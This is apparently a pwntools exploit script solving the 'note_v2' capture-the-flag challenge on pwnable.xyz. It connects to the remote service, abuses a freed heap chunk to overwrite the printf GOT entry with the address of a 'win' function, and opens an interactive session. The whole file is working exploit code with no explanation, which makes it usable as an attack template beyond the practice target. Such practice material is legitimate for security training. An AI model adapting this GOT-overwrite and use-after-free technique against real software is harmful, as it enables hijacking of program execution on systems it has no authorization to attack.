from pwn import *

context.log_level = "debug"

#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30030)
e = ELF("./note_v2")
#gdb.attach(p)

win_addr = e.symbols['win']
printf_got = e.got['printf']
printf_got = '\x40\x20\x60'

def make_note(size, title, note):
    p.sendlineafter("> ", str(1))
    p.sendlineafter("note: ", str(size))
    p.sendafter("title: ", title)
    p.sendafter("note: ", note)

def edit_note(idx, note):
    p.sendlineafter("> ", str(1))
    p.sendlineafter("Note#: ", str(idx))
    p.sendafter(": ", note)

# 1. make chunk
make_note(40, "A", "A"*0x20+printf_got)

# 2. free
p.sendlineafter("> ", str(3))
p.sendlineafter("#: ", str(0))

# 3. make chunk
make_note(40, "B", p64(win_addr))

# 4. execute win
p.sendlineafter("> ", str(4))
p.sendlineafter("#: ", str(0))

p.interactive()
